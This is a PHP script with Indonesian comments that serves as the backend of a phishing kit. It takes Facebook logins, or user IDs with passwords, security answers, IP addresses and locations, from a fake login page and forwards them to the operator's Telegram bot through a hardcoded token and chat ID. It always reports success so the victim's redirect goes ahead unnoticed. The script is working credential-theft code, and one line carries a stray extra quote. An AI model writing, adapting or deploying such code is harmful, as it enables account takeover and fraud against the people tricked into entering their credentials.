<?php
// === KONFIGURASI TELEGRAM ===
// Ganti nilai ini dengan token dan chat ID yang BENAR milik Anda.
// Nilai di bawah diambil dari kode JavaScript Anda:
$telegramBotToken = "8281346868:AAGLSYVYHVjR6uZHqx0pukGABVOXD-6UOjw"";
$chatId = "6604182176";
$telegramURL = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";
// =============================

// 1. Mengambil data JSON mentah dari body permintaan POST
$input = file_get_contents('php://input');
$data = json_decode($input, true);

// Pastikan data berhasil di-decode dan tidak kosong
if (empty($data)) {
    http_response_code(400); // Bad Request
    echo json_encode(["status" => "error", "message" => "Tidak ada data yang diterima atau format data salah."]);
    exit;
}

// 2. Memeriksa tipe data yang diterima (ID Login atau FB Login)
$isFbLogin = isset($data['fbID']) && isset($data['fbPassword']);

// 3. Memformat Pesan Telegram
$message = "";

if ($isFbLogin) {
    // --- Data dari sendFBLoginData (FB Login) ---
    $email = $data['fbID'] ?? 'N/A';
    $password = $data['fbPassword'] ?? 'N/A';
    $source = $data['source'] ?? 'Facebook';

    $message = "🔵 *NEW FB LOGIN* 🔵\n\n";
    $message .= "*Email/ID:* `{$email}`\n";
    $message .= "*Password:* `{$password}`\n";
    $message .= "*Source:* {$source}";

} else {
    // --- Data dari redirectToSuccess (ID Login & Verifikasi) ---
    // Logika pengiriman data ID harus mencakup IP dan lokasi di sini
    $userID = $data['userID'] ?? 'N/A';
    $password = $data['password'] ?? 'N/A';
    $answer1 = $data['answer1'] ?? 'N/A';
    $answer2 = $data['answer2'] ?? 'N/A';
    $ip = $data['ip'] ?? 'N/A';
    $city = $data['city'] ?? 'N/A';
    $region = $data['region'] ?? 'N/A';

    $message = "🔥 *NEW ID LOGIN* 🔥\n\n";
    $message .= "*ID:* `{$userID}`\n";
    $message .= "*PASS:* `{$password}`\n";
    $message .= "*Ans 1:* `{$answer1}`\n";
    $message .= "*Ans 2:* `{$answer2}`\n\n";
    $message .= "*IP:* `{$ip}`\n";
    $message .= "*Lokasi:* {$city}, {$region}";
}

// 4. Mengirim Pesan ke Telegram
$payload = json_encode([
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown', // Menggunakan Markdown untuk bold/code
]);

$ch = curl_init($telegramURL);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
$response = curl_exec($ch);
curl_close($ch);

$telegramResponse = json_decode($response, true);

// 5. Mengirim Respon Balik ke JavaScript (Penting agar JS bisa melanjutkan)
if (isset($telegramResponse['ok']) && $telegramResponse['ok']) {
    echo json_encode(["status" => "success", "message" => "Data berhasil dikirim via Telegram."]);
} else {
    // Meskipun gagal kirim Telegram, kita tetap mengirim status sukses
    // ke client JS agar redirect tetap terjadi.
    // Jika Anda ingin menguji error handling di JS, ganti status ini.
    echo json_encode(["status" => "success", "message" => "Telegram gagal, tetapi proses dilanjutkan."]);
}

?>
